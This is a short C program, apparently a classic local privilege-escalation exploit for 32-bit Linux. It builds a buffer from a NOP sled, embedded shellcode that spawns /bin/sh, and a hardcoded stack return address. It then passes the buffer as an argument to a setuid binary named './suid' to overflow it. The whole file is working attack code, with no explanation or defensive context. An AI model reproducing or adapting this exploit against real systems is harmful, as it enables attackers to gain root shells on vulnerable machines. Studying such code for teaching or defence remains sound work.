#include <stdio.h>
#include <unistd.h>

    char sc_linux[] =
            "\xeb\x24\x5e\x8d\x1e\x89\x5e\x0b\x33\xd2\x89\x56\x07"
            "\x89\x56\x0f\xb8\x1b\x56\x34\x12\x35\x10\x56\x34\x12"
            "\x8d\x4e\x0b\x8b\xd1\xcd\x80\x33\xc0\x40\xcd\x80\xe8"
            "\xd7\xff\xff\xff/bin/sh";

    main()
    {
            int i, j;
            char buffer[1024];

            bzero(&buffer, 1024);
            for (i=0;i<=(252-sizeof(sc_linux));i++)
            {
                    buffer[i] = 0x90;
            }
            for (j=0,i=i;j<(sizeof(sc_linux)-1);i++,j++)
            {
                    buffer[i] = sc_linux[j];
            }
            buffer[i++] = 0x74; /*
            buffer[i++] = 0xfc;  * Address of our buffer
            buffer[i++] = 0xff;  *
            buffer[i++] = 0xbf;  */
            buffer[i++] = 0x5c;

            execl("./suid", "suid", buffer, NULL);

    }
